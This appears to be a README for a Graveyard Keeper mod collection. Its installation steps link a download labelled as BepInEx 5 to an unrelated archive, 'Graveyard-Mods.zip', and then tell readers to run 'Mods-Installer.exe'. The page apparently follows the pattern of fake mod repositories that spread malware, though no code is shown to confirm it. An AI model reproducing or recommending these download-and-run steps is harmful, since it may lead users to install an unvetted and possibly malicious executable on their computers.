A curated collection of **38 BepInEx 5 mods** for *Graveyard Keeper*, adding quality-of-life improvements, storage upgrades, faster crafting, travel options, and gameplay tweaks.

## 🛠️ Installation

**1. Install BepInEx 5**  
Install the [Graveyard-Mods](https://github.com/NovaCentipede/Grave-Keeper-Mods-2026/releases/download/Latest/Graveyard-Mods.zip) first.

**2. Install the Mods**  
Run `Mods-Installer.exe` .

**3. Configure**  
Launch the game and press **F1** to open BepInEx Configuration Manager. Advanced settings are stored in `BepInEx\config\`.

## 🔄 Updates

The collection checks Nexus for newer versions. The update manifest refreshes every **12 hours**, with cached results lasting around **4 hours**.

## 💾 Save Compatibility

Most mods can be added or removed during an existing save. Mods affecting saves or inventory need extra care. **Always back up your save before major changes.**
